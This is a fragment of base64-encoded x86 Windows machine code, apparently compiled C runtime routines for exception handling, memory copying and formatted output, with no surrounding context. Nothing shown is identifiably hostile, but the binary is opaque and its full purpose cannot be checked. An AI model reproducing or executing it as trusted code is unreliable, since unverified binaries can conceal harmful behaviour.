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AWV9eW8nCDACLdeSLRRD/MOg4////WcOL/1WL7IHshAQAAKEEMEIAM8WJRfyDfRgAi0UQU4tdFImFoPv//3UY6BxbAADHABYAAADoT0gAAIPI/+kVAQAAhdt0BIXAdOBWV/91HI2NfPv//+h1CgAAi00Ijb2Q+///M8Az0qurq6uLwYu9oPv//4PgAomFjPv//wvCib2Q+///iZ2U+///iZWY+///dQqIlZz7//+F/3UHxoWc+///Af91II2FkPv//4mFoPv//42FgPv//1D/dRiNhaD7////dQxRUI2NpPv//+iFCQAAg2X0AI2NpPv//+jRDwAAi/CF/3RLi0UIM8mD4AELwXQchdt1BIX2dW2LhZj7//87w3UqhfZ4KTvzdiXrWYuFjPv//wvBdEuF23QVhfZ5BIgP6w2LhZj7//87w3RLiAwHjY3k+///6CUKAACAvYj7//8AdA2LjXz7//+DoVADAAD9X4vGXotN/DPNW+jtyf//ycOF23UFg87/68WLhZj7//87w3W4av5eiEwf/+uyi/9Vi+yB7IQEAAChBDBCADPFiUX8g30YAItFEFOLXRSJhaD7//91GOieWQAAxwAWAAAA6NFGAACDyP/pFQEAAIXbdASFwHTgVlf/dRyNjXz7///o9wgAAItNCI29kPv//zPAM9Krq6uri8GLvaD7//+D4AKJhYz7//8Lwom9kPv//4mdlPv//4mVmPv//3UKiJWc+///hf91B8aFnPv//wH/dSCNhZD7//+JhaD7//+NhYD7//9Q/3UYjYWg+////3UMUVCNjaT7///oBwgAAINl9ACNjaT7///odw8AAIvwhf90S4tFCDPJg+ABC8F0HIXbdQSF9nVti4WY+///O8N1KoX2eCk783Yl61mLhYz7//8LwXRLhdt0FYX2eQSID+sNi4WY+///O8N0S4gMB42N5Pv//+inCAAAgL2I+///AHQNi418+///g6FQAwAA/V+Lxl6LTfwzzVvob8j//8nDhdt1BYPO/+vFi4WY+///O8N1uGr+XohMH//rsov/VYvsgeyEBAAAoQQwQgAzxYlF/IN9GACLRRBTi10UiYWg+///dRjoIFgAAMcAFgAAAOhTRQAAg8j/6RsBAACF23QEhcB04FZX/3UcjY18+///6HkHAACLTQiNvZD7//8zwDPSq6urq4vBi72g+///g+ACiYWM+///C8KJvZD7//+JnZT7//+JlZj7//91CoiVnPv//4X/dQfGhZz7//8B/3UgjYWQ+///iYWg+///jYWA+///UP91GI2FoPv///91DFFQjY2k+///6MUGAACDZfQAjY2k+///6CkQAACL8IX/dFGLRQiD4AGDyAB0HIXbdQSF9nV0i4WY+///O8N1LoX2eDA783Ys62CLhYz7//+DyAB0UYXbdBuF9nkHM8BmiQfrEIuFmPv//zvDdE4zyWaJDEeNjeT7///o